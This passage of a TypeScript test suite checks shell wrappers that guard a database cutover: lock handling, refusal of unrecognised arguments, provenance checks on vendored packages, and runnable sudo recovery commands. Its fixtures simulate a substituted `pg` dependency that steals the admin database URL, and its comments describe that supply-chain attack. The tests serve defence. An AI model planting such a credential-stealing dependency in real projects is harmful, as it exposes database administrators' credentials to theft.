    // was never attempted. So the token this record displays is read off a probe run, the record
    // is put back to the bytes that token belongs to, and the real run types it: the operator
    // confirms the record they were shown, and the record changes underneath them anyway.
    const probe = runOnTty(paths.resolveWrapper, ['--this-fence-revoked-them'], 'stamp-000000000000')
    assert.equal(probe.status, 1, `the probe run must abort at the terminal:\n${probe.output}`)
    const movedToken = tokenFrom(probe.output, 'stamp')
    plantFingerprinted()
    const moved = runOnTty(paths.resolveWrapper, ['--this-fence-revoked-them'], movedToken)
    assert.equal(moved.status, 1, `a record that moved under the audit must not be stamped:\n${moved.output}`)
    assert.match(moved.output, /NOT STAMPED/, `and must say so:\n${moved.output}`)
    assert.match(moved.output, /inspected and audited/, `naming the bytes it was held to:\n${moved.output}`)
    assert.equal(readFileSync(state, 'utf8'), replacement, 'and what is there is what the other writer left')
    assert.equal(JSON.parse(readFileSync(state, 'utf8')).fence_applied, undefined, 'unstamped')
    // AND THE SAME FOR THE REMOVAL, which is the more expensive of the two: a record deleted in
    // error is the only account of what a standing fence revoked.
    plantFingerprinted()
    fixture({ privileges: UNFENCED, rewriteStateTo: replacement })
    const movedClear = run(paths.resolveWrapper)
    assert.equal(movedClear.status, 1, `a record that moved under the audit must not be removed:\n${movedClear.stdout}${movedClear.stderr}`)
    assert.equal(existsSync(state), true, 'and must still be there')
    assert.match(movedClear.stderr, /NOT CLEARED/, movedClear.stderr)
    assert.match(movedClear.stderr, /inspected and audited/, `saying that the bytes moved:\n${movedClear.stderr}`)

    // PHASE 10 — AND ALL THREE WRAPPERS HOLD THE SHARED CUTOVER LOCK FOR THE WHOLE SEQUENCE
    // (o3d-secops r28, Codex HIGH 3). A cutover, or another wrapper, holding it means this one
    // reads nothing at all — which is the point: the interleaving the finding describes starts at
    // the read.
    plantFingerprinted()
    fixture({ privileges: UNFENCED })
    writeFileSync(calls, '')
    const before = readFileSync(state, 'utf8')
    for (const wrapper of [paths.resolveWrapper, paths.releaseWrapper, paths.refenceWrapper]) {
      const held = spawnSync('bash', [
        '-c',
        'exec 9<"$1" || exit 90; flock -n 9 || exit 91; "$2"; printf "WRAPPER_RC=%s\\n" "$?"',
        'holder', cutoverLock, wrapper,
      ], { encoding: 'utf8', env: wrapperEnv })
      const said = `${held.stdout ?? ''}${held.stderr ?? ''}`
      assert.match(said, /^WRAPPER_RC=1$/m, `${wrapper} must refuse while the cutover lock is held:\n${said}`)
      assert.match(said, /is held by another run/, `${wrapper} must say what holds it:\n${said}`)
      assert.equal(readFileSync(state, 'utf8'), before, `${wrapper}: and must change nothing`)
      assert.equal(readFileSync(calls, 'utf8'), '', `${wrapper}: and must not reach the helper at all`)
    }
    // AND THE LOCK IS RELEASED WITH THE PROCESS, so the very next run works. Without this the
    // assertions above would be satisfied by a wrapper that refuses unconditionally.
    const afterLock = run(paths.resolveWrapper)
    assert.equal(afterLock.status, 0, `with nothing holding the lock the same run must proceed:\n${afterLock.stdout}${afterLock.stderr}`)
    assert.equal(existsSync(state), false, 'and clear the attributable spent record it was given')

    // PHASE 7 — AND AN ARGUMENT IT DOES NOT RECOGNISE IS A REFUSAL, NOT SOMETHING IGNORED.
    plantLegacy()
    fixture({ privileges: FENCED })
    writeFileSync(calls, '')
    const mistyped = run(paths.resolveWrapper, ['--this-fence-revoked-tem'])
    assert.equal(mistyped.status, 1, `an unrecognised argument must refuse:\n${mistyped.stdout}${mistyped.stderr}`)
    assert.match(mistyped.stderr, /unrecognised argument/, mistyped.stderr)
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'and change nothing')
    assert.equal(readFileSync(calls, 'utf8'), '', 'and never reach the helper at all')

    // AND WITH NO RECORD AT ALL, which is not a fence it may declare resolved either.
    plantLegacy()
    rmSync(state)
    const nothing = run(paths.resolveWrapper)
    assert.equal(nothing.status, 1, `${nothing.stdout}${nothing.stderr}`)
    assert.match(nothing.stderr, /NOT RESOLVABLE/, nothing.stderr)
    assert.equal(existsSync(state), false, 'and it creates nothing')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

// ---------------------------------------------------------------------------
// r33: WHAT A SCRIPT-ONLY PIN AUTHENTICATES, AND WHAT IT DOES NOT
// (o3d-2sm1.5, Codex CRITICAL)
//
// r32 made the protected artefact self-contained and gave it a whole-tree digest. That
// authenticates the tree from the moment it is RECORDED; it says nothing about what the tree was
// first assembled FROM. IMS_FENCE_SCRIPT_SHA256 covers the entry file, the closure is vendored
// out of ${APP_DIR}/node_modules, and an account that can write there can leave the legitimate
// helper untouched, replace one file inside `pg`, and have those bytes sealed, digested and
// recorded as the trusted artefact. `pg` is imported before main() runs.
//
// So the script-only pin now has a stated meaning: it authenticates the ENTRY FILE, and it is
// sufficient on its own ONLY where the closure's source is already one nobody else can write. It
// is never silently treated as covering more than that — from an application-writable checkout it
// is REFUSED, naming IMS_FENCE_ARTEFACT_SHA256 and three ways to obtain it.
// ---------------------------------------------------------------------------

/** sha256 of a file, the way an operator would take it. */
function sha256File(path: string): string {
  return execFileSync('sha256sum', [path], { encoding: 'utf8' }).split(' ')[0]
}

const escapeRe = (text: string): string => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')

test('r33: a script-only pin cannot authorise a publication whose closure comes from an application-writable checkout', () => {
  // THE LOAD-BEARING TEST FOR THE CRITICAL. The entry file is the legitimate one and its digest
  // MATCHES — that is the whole point: only a vendored package was replaced, in a directory the
  // application account owns. r32 would have sealed, digested and recorded those bytes as
  // trusted, and the recorded digest would then have protected them.
  //
  // "Application-writable" is proved here through the group-write arm of the predicate, because
  // this suite does not run as root and cannot chown a file to another uid. The OWNERSHIP arm —
  // which is the production arm, where the checkout belongs to the application account — is
  // exercised directly in the test below.
  //
  // MUTATION ROUTE (each verified by making the change locally and re-running):
  //   1. delete the `-n "${DB_FENCE_SOURCE_UNTRUSTED_PATH}"` gate from _fence_stage_and_publish():
  //      PHASE 1 publishes, and the protected artefact holds the credential-stealing `pg`.
  //   2. drop the `-perm /022` clause from _fence_source_trust(): the same, because the source
  //      stops being recognised as writable by anybody else.
  //   3. delete the `_fence_source_trust` call from _fence_vendor_into(): PHASE 1 publishes while
  //      PHASE 3 still passes, so nothing else in the suite notices.
  // Under mutation 1 the consequence was measured rather than assumed: the artefact publishes,
  // ${recovery}/app/node_modules/pg/lib/index.js holds SUBSTITUTED-PG, and running the PROTECTED
  // helper writes the admin URL out — a legitimate entry-file digest, an attacker's closure.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r33-pin-'))
  try {
    // A checkout whose HELPER is the shipped one and whose `pg` steals the admin credential.
    writeFenceCheckout(dir, importReportingHelper(dir), STEALING_PG)
    chmodSync(checkoutPgEntry(dir), 0o664)
    const entryDigest = sha256File(checkoutHelper(dir))
    const paths = protectedPaths(dir)

    // PHASE 1 — THE PIN THAT LOOKS LIKE AUTHORISATION.
    const refused = runShell(
      artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_SCRIPT_SHA256=${entryDigest}`]),
    )
    assert.match(refused.output, /^RC=1$/m, `a script-only pin must not authorise this publication:\n${refused.output}`)
    assert.match(refused.output, /IMS_FENCE_SCRIPT_SHA256 IS NOT SUFFICIENT HERE/, refused.output)
    // THE PRECONDITION THAT MAKES THE REFUSAL MEAN WHAT IT SAYS: the entry-file pin MATCHED. A
    // refusal over a mismatched entry file would be the r31 behaviour and would prove nothing.
    assert.match(refused.output, new RegExp(`${entryDigest}, which did match`), refused.output)
    assert.match(refused.output, /IMS_FENCE_ARTEFACT_SHA256=<digest of the WHOLE tree>/, 'naming the variable that would cover the rest')
    assert.match(refused.output, /--dry-run/, 'and how to obtain it before there is anything published to read it off')
    assert.match(
      refused.output,
      new RegExp(escapeRe(checkoutPgEntry(dir))),
      `and the path that makes the source application-writable:\n${refused.output}`,
    )
    assert.match(refused.output, /REPORTED AND NOT AUTHENTICATED/, 'and the digest it offers is labelled as coming from the checkout under question')
    assert.ok(!existsSync(paths.app), 'and NOTHING may be published')

    // THE CONTROL, which is what makes the assertions above mean something: the substitution is
    // live. Reached from the checkout's own helper, that `pg` runs and takes the credential.
    const stolen = join(dir, 'STOLEN')
    const env = {
      ...process.env,
      DEPLOY_ADMIN_DATABASE_URL: 'postgresql://admin:sup3rsecret@127.0.0.1:5432/imsdb',
      IMS_TEST_STOLEN_PATH: stolen,
    }
    const control = spawnSync('node', [checkoutHelper(dir)], { encoding: 'utf8', env, cwd: dir })
    assert.equal(control.status, 0, `${control.stdout}${control.stderr}`)
    assert.equal(
      readFileSync(stolen, 'utf8'),
      'postgresql://admin:sup3rsecret@127.0.0.1:5432/imsdb',
      'precondition: the substituted package really does take the credential when it runs',
    )
    rmSync(stolen)

    // PHASE 2 — THE REMEDY THE MESSAGE NAMES ACTUALLY WORKS. An operator who has compared the
    // reported value against the release pins it, and the same publication goes through. An
    // instruction that cannot be followed is the defect this round is about, one level down.
    const reported = /just now hashes to ([0-9a-f]{64})/.exec(refused.output)?.[1]
    assert.ok(reported, `the refusal must report what the tree would hash to:\n${refused.output}`)
    const pinned = runShell(
      artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [
        `IMS_FENCE_SCRIPT_SHA256=${entryDigest}`,
        `IMS_FENCE_ARTEFACT_SHA256=${reported}`,
      ]),
    )
    assert.match(pinned.output, /^RC=0$/m, `the artefact pin the refusal named must be accepted:\n${pinned.output}`)
    assert.equal(
      /^fence_artefact_sha256=([0-9a-f]{64})$/m.exec(readFileSync(paths.artefactFile, 'utf8'))?.[1],
      reported,
      'and what it records is the tree the operator pinned',
    )
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }

  // PHASE 3 — AND IT IS NOT A BLANKET REFUSAL. The same script-only pin, over a checkout nobody
  // but this account can write, publishes: that is the "source that is already trusted" half of
  // what the pin now means, and without it this guard could not distinguish anything.
  const clean = mkdtempSync(join(tmpdir(), 'ims-r33-clean-'))
  try {
    writeFenceCheckout(clean, importReportingHelper(clean))
    const digest = sha256File(checkoutHelper(clean))
    const result = runShell(
      artefactHarness(clean, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_SCRIPT_SHA256=${digest}`]),
    )
    assert.match(result.output, /^RC=0$/m, `a trusted source must publish under the entry-file pin alone:\n${result.output}`)
    assert.doesNotMatch(result.output, /IS NOT SUFFICIENT/, result.output)
    assert.ok(existsSync(protectedPaths(clean).helper), 'and the artefact must be standing')
  } finally {
    rmSync(clean, { recursive: true, force: true })
  }
})

test('r34: an unpinned bootstrap out of an application-writable checkout is REFUSED, and says how to get the digest', () => {
  // THE OTHER HALF OF THE SAME QUESTION, AND A RULING AGAINST r33. r33 published here and printed
  // TRUST ON FIRST USE, arguing that refusing would leave a mechanism that cannot start on a
  // release nobody has published. The hidden premise was that the digest can only come from a
  // PRIOR PUBLICATION. It can also ship WITH the release — so the refusal has a precondition an
  // operator can satisfy, and a warning nobody has to acknowledge stops being the whole control
  // over bytes that are handed an administrative credential four times across a cutover.
  //
  // MUTATION ROUTE (each verified by making the change locally and re-running):
  //   1. put r33's trust-on-first-use branch back — set DB_FENCE_ROTATION_NOTE and fall through
  //      instead of returning 1 — and PHASE 1 fails: RC=0, ${recovery}/app is standing, and its
  //      node_modules/pg holds the credential-stealing body.
  //   2. drop ${DB_FENCE_ARTEFACT_SOURCE_TEXT} from the refusal: the four instruction assertions
  //      fail, which is the difference between a refusal and a dead end.
  //   3. delete the `-n "${DB_FENCE_SOURCE_UNTRUSTED_PATH}"` condition so every unpinned
  //      bootstrap refuses: PHASE 3 fails — a root-owned source can no longer start at all, which
  //      is the failure mode this test exists to keep out.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r34-boot-'))
  try {
    writeFenceCheckout(dir, importReportingHelper(dir), STEALING_PG)
    chmodSync(checkoutPgEntry(dir), 0o664)
    const paths = protectedPaths(dir)

    // PHASE 1 — THE REFUSAL.
    const boot = runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"']))
    assert.match(boot.output, /^RC=1$/m, `an unauthenticated bootstrap must not publish:\n${boot.output}`)
    assert.match(boot.output, /NOTHING AUTHENTICATED THIS ARTEFACT/, boot.output)
    assert.ok(!existsSync(paths.app), 'and NOTHING may be standing afterwards')
    assert.match(boot.output, new RegExp(escapeRe(checkoutPgEntry(dir))), 'naming what made the source untrusted')

    // AND THE PRECONDITION IS ONE SOMEBODY CAN SATISFY. A refusal that cannot be answered is the
    // failure this round was warned about by name, so the message is asserted to carry all four
    // routes to the value it demands.
    assert.match(boot.output, /IMS_FENCE_ARTEFACT_SHA256=<digest of the WHOLE tree>/, 'the variable it wants')
    assert.match(boot.output, /published WITH THE RELEASE/, 'where a first-ever install gets it')
    assert.match(boot.output, /--dry-run/, 'how the release host produces it')
    assert.match(boot.output, /fence_artefact_sha256=/, 'and where a host that already has it keeps it')
    assert.match(boot.output, /bootstrap from a source only this account can write/, 'and the way out that needs no digest at all')

    // THE CONTROL: the substitution is live, so what was refused was a real theft and not a
    // hypothetical one.
    const stolen = join(dir, 'STOLEN')
    const control = spawnSync('node', [checkoutHelper(dir)], {
      encoding: 'utf8',
      cwd: dir,
      env: {
        ...process.env,
        DEPLOY_ADMIN_DATABASE_URL: 'postgresql://admin:sup3rsecret@127.0.0.1:5432/imsdb',
        IMS_TEST_STOLEN_PATH: stolen,
      },
    })
    assert.equal(control.status, 0, `${control.stdout}${control.stderr}`)
    assert.equal(
      readFileSync(stolen, 'utf8'),
      'postgresql://admin:sup3rsecret@127.0.0.1:5432/imsdb',
      'precondition: the closure that was refused really does take the credential when it runs',
    )
    rmSync(stolen)

    // PHASE 2 — THE ANSWER WORKS. The operator obtains the whole-tree digest (here, the same way
    // the release host produces it: assemble and hash without executing) and the bootstrap goes
    // through. This is the assertion that keeps the refusal from being a brick wall.
    const probe = runShell(
      artefactHarness(dir, ['db_fence_probe_digests >/dev/null 2>&1', 'echo "CANDIDATE=[${DB_FENCE_PROBE_ARTEFACT_SHA256}]"']),
    )
    const candidate = /^CANDIDATE=\[([0-9a-f]{64})\]$/m.exec(probe.output)?.[1] ?? ''
    assert.match(candidate, /^[0-9a-f]{64}$/, `the digest must be obtainable without publishing:\n${probe.output}`)
    const pinned = runShell(
      artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_ARTEFACT_SHA256=${candidate}`]),
    )
    assert.match(pinned.output, /^RC=0$/m, `the pinned bootstrap must publish:\n${pinned.output}`)
    assert.equal(
      /^fence_artefact_sha256=([0-9a-f]{64})$/m.exec(readFileSync(paths.artefactFile, 'utf8'))?.[1],
      candidate,
      'and record the tree the operator pinned',
    )
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }

  // PHASE 3 — AND IT IS A RULE ABOUT PROVENANCE, NOT ABOUT PINS. A source only the publishing
  // account can write still bootstraps with no digest at all: that is the second route the
  // refusal names, and without it this guard would be a ban rather than a rule.
  const clean = mkdtempSync(join(tmpdir(), 'ims-r34-boot-clean-'))
  try {
    writeFenceCheckout(clean, importReportingHelper(clean))
    const result = runShell(artefactHarness(clean, ['db_fence_script_in_use >/dev/null; echo "RC=$?"']))
    assert.match(result.output, /^RC=0$/m, `a trusted source must still be able to start:\n${result.output}`)
    assert.doesNotMatch(result.output, /NOTHING AUTHENTICATED/, result.output)
    assert.ok(existsSync(protectedPaths(clean).helper), 'and the artefact must be standing')
  } finally {
    rmSync(clean, { recursive: true, force: true })
  }
})

test('r33: the provenance question is asked about ownership as well as modes, and a source it cannot read is a refusal', () => {
  // The predicate has two arms and production uses the one this suite cannot create by chowning:
  // the checkout belongs to the APPLICATION ACCOUNT, not to the publisher. So it is exercised
  // against a path that really is owned by somebody else, whoever this suite is running as.
  //
  // MUTATION ROUTE (each verified locally):
  //   1. delete `! -uid "${uid}" -o` from _fence_source_trust(): CASE 1 reports nothing.
  //   2. delete `-perm /022`: CASE 3 reports nothing.
  //   3. change either `|| return 1` after a find to `|| offender=""`: CASE 4 answers "trusted"
  //      for a source it could not stat at all, which is the one answer that must never be a pass.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r33-uid-'))
  try {
    const uid = process.getuid!()
    const appDir = join(dir, 'app')
    mkdirSync(join(appDir, 'scripts'), { recursive: true })
    const entry = join(appDir, 'scripts', 'fence-db-connections.mjs')
    writeFileSync(entry, '// helper\n')
    const list = join(dir, 'closure.list')

    // A path owned by SOMEBODY ELSE. As root that has to be made; as anyone else the system
    // already provides one.
    let foreign = '/usr/bin'
    if (uid === 0) {
      foreign = join(dir, 'foreign')
      mkdirSync(foreign)
      assert.equal(spawnSync('chown', ['nobody', foreign]).status, 0, 'precondition: a foreign-owned directory is needed')
    }
    assert.notEqual(statSync(foreign).uid, uid, 'precondition: the subject must be owned by another account')

    const ask = (appDirectory: string, listBody: string): { status: number; output: string } => {
      writeFileSync(list, listBody)
      return runShell(
        [
          'set -uo pipefail',
          'exec 2>&1',
          `source ${JSON.stringify(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'))}`,
          `DB_FENCE_SCRIPT=${JSON.stringify(entry)}`,
          `_fence_source_trust ${JSON.stringify(appDirectory)} ${JSON.stringify(list)} || { echo "RC=1"; exit 0; }`,
          'echo "RC=0"',
          'echo "UNTRUSTED=[${DB_FENCE_SOURCE_UNTRUSTED_PATH}]"',
        ].join('\n'),
      )
    }

    // CASE 1 — OWNED BY ANOTHER ACCOUNT. This is the production shape.
    const owned = ask(foreign, '')
    assert.match(owned.output, /^RC=0$/m, owned.output)
    assert.match(owned.output, new RegExp(`UNTRUSTED=\\[${escapeRe(foreign)}\\]`), `ownership must be reported:\n${owned.output}`)

    // CASE 2 — OUR OWN, MODE-CLEAN TREE. The guard must be able to answer "trusted", or it is
    // not a guard, it is a ban.
    const mine = ask(appDir, '')
    assert.match(mine.output, /^UNTRUSTED=\[\]$/m, `a source only this account can write must pass:\n${mine.output}`)

    // CASE 3 — OUR OWN TREE WITH ONE GROUP-WRITABLE FILE INSIDE A VENDORED PACKAGE.
    mkdirSync(join(appDir, 'node_modules', 'pg'), { recursive: true })
    const loose = join(appDir, 'node_modules', 'pg', 'index.js')
    writeFileSync(loose, 'module.exports = {}\n')
    chmodSync(loose, 0o664)
    const writable = ask(appDir, 'node_modules/pg\n')
    assert.match(writable.output, new RegExp(`UNTRUSTED=\\[${escapeRe(loose)}\\]`), `a group-writable file must be reported:\n${writable.output}`)

    // CASE 4 — A SOURCE IT CANNOT STAT. "No answer" may not read as "no problem".
    const missing = ask(appDir, 'node_modules/not-there\n')
    assert.match(missing.output, /^RC=1$/m, `a closure path that cannot be examined must be a refusal:\n${missing.output}`)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

// ---------------------------------------------------------------------------
// r33: THE PRINTED-INSTRUCTION SWEEP, RE-RUN WITH THE QUESTION RESTATED
// (o3d-2sm1.5, Codex HIGH)
//
// r32 asked of every printed line "would it run if pasted?" and answered yes for the recovery
// wrappers. That answer was right for root and wrong for the person most likely to be reading the
// banner: the wrappers are root-owned and 0700, and an operator who launched the cutover with
// `sudo bash scripts/update.sh` is back in a NON-ROOT shell when it prints. So the question is
// now asked as: would this run when pasted BY THE ACCOUNT THAT READS THIS BANNER.
// ---------------------------------------------------------------------------

test('r33: every printed recovery instruction carries the privilege the account reading it has', () => {
  // MUTATION ROUTE (each verified locally):
  //   1. change DB_FENCE_RELEASE_CMD back to "${DB_FENCE_RELEASE_WRAPPER}" in any entrypoint: the
  //      assignment shape is asserted by the r32 test above, which fails naming that entrypoint —
  //      verified against install.sh.
  //   2. drop `${sudo_prefix}` from the wrapper's credential-missing message: PHASE C fails — the
  //      printed line is the bare `env … /path` form, which PHASE B has just proved is EACCES for
  //      a reader who is not the owner.
  //   3. remove `${DB_FENCE_SUDO_PREFIX}env ` from update.sh's recovery invocation: the
  //      entrypoint-invocation rule fails, naming the line.
  //   4. hard-code `sudo ` in the library instead of resolving it: PHASE A's second case fails,
  //      because a box with no sudo would be told to run a command it does not have.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r33-instr-'))
  try {
    // A `sudo` that only re-executes its arguments. It proves the printed line is a WELL-FORMED
    // command — the right word order, an absolute path, nothing lost to quoting — and reaches the
    // wrapper. It cannot prove sudo grants the privilege; that is sudo's business, and PHASE B is
    // what establishes that the privilege is the thing missing.
    const shim = join(dir, 'bin')
    mkdirSync(shim)
    writeFileSync(join(shim, 'sudo'), '#!/bin/bash\nexec "$@"\n')
    chmodSync(join(shim, 'sudo'), 0o755)
    const sudoPath = `${shim}:${process.env.PATH ?? ''}`

    // ---- PHASE A: the prefix is RESOLVED from the box, not assumed.
    const prefixOn = (path: string): string =>
      runShell(
        [
          `PATH=${JSON.stringify(path)}`,
          `source ${JSON.stringify(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'))}`,
          'printf "PREFIX=[%s]\\n" "${DB_FENCE_SUDO_PREFIX}"',
        ].join('\n'),
      ).output
    assert.match(prefixOn(sudoPath), /^PREFIX=\[sudo \]$/m, 'where sudo exists the instruction carries it')
    assert.match(
      prefixOn(join(dir, 'nowhere')),
      /^PREFIX=\[\]$/m,
      'and where it does not, the instruction is the bare path — a box with no sudo is one the reader can only have reached as root',
    )

    // ---- The three static rules over the entrypoints.
    // R1 — ONE ASSIGNMENT EACH, and the prefix is part of it. (Its exact shape is asserted by the
    // r32 test above; this is the rule that no OTHER line rebuilds a bare command.)
    // R2 — no printed line puts a wrapper PATH where a command belongs.
    const COMMAND_POSITION =
      /^\s*(?:echo(?:\s+-e)?|printf|warn|error|die|info|success|ok)\s+"(?:\$\{(?:RED|YELLOW|GREEN|BLUE|BOLD|RESET)\}|\\[nt]|\s)*\$\{DB_FENCE_(?:RELEASE|REFENCE)_WRAPPER\}/
    const bare: string[] = []
    for (const { name, lines } of ENTRYPOINT_SOURCES) {
      for (const line of lines) {
        if (!isCode(line)) continue
        if (COMMAND_POSITION.test(line)) bare.push(`${name}: ${line.trim()}`)
      }
    }
    assert.deepEqual(bare, [], 'a banner may not offer a root-only wrapper path as the command to run; it must go through DB_FENCE_RELEASE_CMD/DB_FENCE_REFENCE_CMD, which carry the privilege prefix')
    // PRECONDITION, so the empty list is not an empty scan: the rule catches the shape it forbids.
    assert.ok(
      COMMAND_POSITION.test('      error "  ${DB_FENCE_RELEASE_WRAPPER}"') &&
        COMMAND_POSITION.test('          echo -e "${RED}    ${DB_FENCE_REFENCE_WRAPPER}${RESET}" >&2'),
      'precondition: the rule must catch a bare wrapper path in command position',
    )
    // …and it must NOT catch the prose that merely names them, or it would be unusable.
    assert.ok(
      !COMMAND_POSITION.test('    || echo "The recovery wrappers at ${DB_FENCE_RELEASE_WRAPPER} and ${DB_FENCE_REFENCE_WRAPPER} could not be refreshed." >&2'),
      'precondition: prose that names a wrapper is not an instruction to run it',
    )

    // R3 — every printed instruction that INVOKES AN ENTRYPOINT carries the transition too. Those
    // scripts refuse to run as anything but root, so pasted from the operator's shell they die on
    // the identity check with the fence still standing.
    const invocations: string[] = []
    for (const { name, lines } of ENTRYPOINT_SOURCES) {
      for (const line of lines) {
        if (!isCode(line)) continue
        if (!/bash \$\{IMS_ENTRYPOINT_PATH\}/.test(line)) continue
        if (!/\$\{DB_FENCE_SUDO_PREFIX\}env /.test(line)) invocations.push(`${name}: ${line.trim()}`)
      }
    }
    assert.deepEqual(invocations, [], 'a printed instruction that re-runs an entrypoint must carry the privilege transition and pass the credential through `env`')
    // PRECONDITION: the rule catches the line it replaced.
    const r32Line = `    "Supply it on the invocation, as root: DEPLOY_ADMIN_DATABASE_URL='x' bash \${IMS_ENTRYPOINT_PATH} — or ..."`
    assert.ok(
      /bash \$\{IMS_ENTRYPOINT_PATH\}/.test(r32Line) && !/\$\{DB_FENCE_SUDO_PREFIX\}env /.test(r32Line),
      'precondition: the rule catches the pre-r33 wording',
    )

    // ---- The executed half. Publish a real artefact and real wrappers.
    const log = join(dir, 'invocation.json')
    writeFenceCheckout(
      dir,
      [
        "import { writeFileSync } from 'node:fs'",
        "import 'pg'",
        `writeFileSync(${JSON.stringify(log)}, JSON.stringify({ argv: process.argv.slice(2), admin: process.env.DEPLOY_ADMIN_DATABASE_URL ?? '' }))`,
        '',
      ].join('\n'),
    )
    writeFileSync(join(dir, 'app', '.env'), 'DEPLOY_ADMIN_DATABASE_URL="postgresql://admin:pw@127.0.0.1:5432/imsdb"  # deploy admin\n')
    const paths = protectedPaths(dir)
    const publish = runShell(
      artefactHarness(dir, [
        'db_fence_script_in_use >/dev/null || exit 1',
        `db_fence_publish_operator_wrappers "$(id -un)" ${JSON.stringify(join(dir, 'app', '.env'))} ${JSON.stringify(join(dir, 'state.json'))} ${JSON.stringify(join(dir, 'cutover.lock'))} --app-user=imsapp || exit 1`,
      ]),
    )
    assert.equal(publish.status, 0, `the wrappers must be published:\n${publish.output}`)

    // ---- PHASE B: the bare path is what fails, and it fails for exactly this reason.
    for (const wrapper of [paths.releaseWrapper, paths.refenceWrapper]) {
      assert.equal(statSync(wrapper).mode & 0o777, 0o700, `${wrapper} must stay executable by its owner alone`)
    }
    // A reader without the owner's privilege gets EACCES from the kernel, before any message this
    // code could print. Reproduced by taking the execute bit away from the only account this
    // suite has — the same refusal a non-root shell meets on a root-owned 0700 file.
    chmodSync(paths.releaseWrapper, 0o000)
    const denied = spawnSync(paths.releaseWrapper, [], { encoding: 'utf8' })
    assert.equal(
      (denied.error as NodeJS.ErrnoException | undefined)?.code,
      'EACCES',
      `precondition: a reader who may not execute the wrapper must be refused by the kernel, not by the wrapper:\n${denied.stderr ?? ''}`,
    )
    assert.ok(!existsSync(log), 'and nothing runs')
    chmodSync(paths.releaseWrapper, 0o700)

    // ---- PHASE C: the printed instruction, pasted, runs.
    // 1. THE BANNER FORM. `${DB_FENCE_SUDO_PREFIX}${DB_FENCE_RELEASE_WRAPPER}` is what every
    //    entrypoint prints; assembled with a PATH that has sudo, it is `sudo <absolute path>`.
    const bannerLine = `${sudoPrefixOn(sudoPath)}${paths.releaseWrapper}`
    assert.equal(bannerLine, `sudo ${paths.releaseWrapper}`, 'the banner must print the transition and the absolute path')
    const banner = spawnSync('bash', ['-c', bannerLine], { encoding: 'utf8', env: { PATH: sudoPath } as unknown as NodeJS.ProcessEnv })
    assert.equal(banner.status, 0, `the banner's instruction must run as pasted:\n${banner.stdout}${banner.stderr}`)
    assert.equal(JSON.parse(readFileSync(log, 'utf8')).argv[0], '--release', 'and reach the protected helper')

    // 2. THE CREDENTIAL-MISSING FORM, which is the one Codex named. Read what the wrapper prints
    //    for the shell it is being read in, then paste that line back.
    rmSync(log)
    renameSync(join(dir, 'app', '.env'), join(dir, 'app', '.env.away'))
    const refused = spawnSync(paths.releaseWrapper, [], { encoding: 'utf8', env: { PATH: sudoPath } as unknown as NodeJS.ProcessEnv })
    assert.equal(refused.status, 1, 'a wrapper with no credential must refuse')
    const printed = refused.stderr.split('\n').find((line) => line.includes('DEPLOY_ADMIN_DATABASE_URL='))
    assert.ok(printed, `it must print a command that supplies it:\n${refused.stderr}`)
    assert.equal(
      printed!.trim(),
      `sudo env DEPLOY_ADMIN_DATABASE_URL='postgresql://ADMIN:PASSWORD@HOST:PORT/DATABASE' ${paths.releaseWrapper}`,
      `and it must be runnable by the account reading it:\n${refused.stderr}`,
    )
    const pasted = printed!.replace('postgresql://ADMIN:PASSWORD@HOST:PORT/DATABASE', 'postgresql://typed:in@127.0.0.1:5432/imsdb')
    const supplied = spawnSync('bash', ['-c', pasted], { encoding: 'utf8', env: { PATH: sudoPath } as unknown as NodeJS.ProcessEnv })
    assert.equal(supplied.status, 0, `and running it must work:\n${supplied.stdout}${supplied.stderr}`)
    assert.equal(
      JSON.parse(readFileSync(log, 'utf8')).admin,
      'postgresql://typed:in@127.0.0.1:5432/imsdb',
      'with the credential it told the operator to type',
    )
    renameSync(join(dir, 'app', '.env.away'), join(dir, 'app', '.env'))

    // 3. WITHOUT SUDO ON THE BOX the same message is the bare form, and that is correct rather
    //    than a fallback: the entrypoints refuse to run as anything but root, so a box with no
    //    sudo is one whose banner can only be being read by root.
    rmSync(log)
    renameSync(join(dir, 'app', '.env'), join(dir, 'app', '.env.away'))
    // A PATH that still has coreutils and no sudo — the wrapper needs `id`, `find`, `sort`,
    // `xargs` and `sha256sum` to reach the message at all, and stripping everything would have
    // tested the wrong refusal.
    //
    // BUILT BY ADDITION, NOT BY SUBTRACTION. The obvious construction — take the real PATH and
    // drop every directory that holds a `sudo` — cannot work on a box where sudo is installed,
    // because sudo lives in /usr/bin alongside bash and the whole of coreutils, so dropping that
    // directory drops the shell too and every spawn below fails with ENOENT rather than with the
    // refusal under test. It only appeared to work on a developer box with no sudo installed at
    // all, where it subtracted nothing. So the directory is assembled instead, and nothing is
    // subtracted from anything: that is a box with no sudo however the box this runs on happens to
    // lay its binaries out.
    //
    // AND ASSEMBLED AS A NAMED CLOSURE, NOT BY LISTING THE PATH. See NO_SUDO_FIXTURE_COMMANDS for
    // where the list comes from and linkExecutableClosure() for why a listing is the wrong
    // question — a search-only (0111) directory supplies commands that run and refuses to be
    // read, so enumerating it lost tools the runner's own PATH resolves perfectly well.
    const noSudoDir = join(dir, 'nosudo')
    mkdirSync(noSudoDir)
    linkExecutableClosure(noSudoDir, NO_SUDO_FIXTURE_COMMANDS, process.env.PATH ?? '')
    const noSudoPath = noSudoDir
    // THE SUDO EXCLUSION IS THE WHOLE POINT OF THE FIXTURE, so it is checked rather than left to
    // the reader of the list: the closure does not name sudo, and — because the directory is built
    // by addition — it holds the closure and nothing else, so nothing could have brought one in.
    assert.ok(!(NO_SUDO_FIXTURE_COMMANDS as readonly string[]).includes('sudo'), 'precondition: the closure must not name sudo')
    assert.deepEqual(
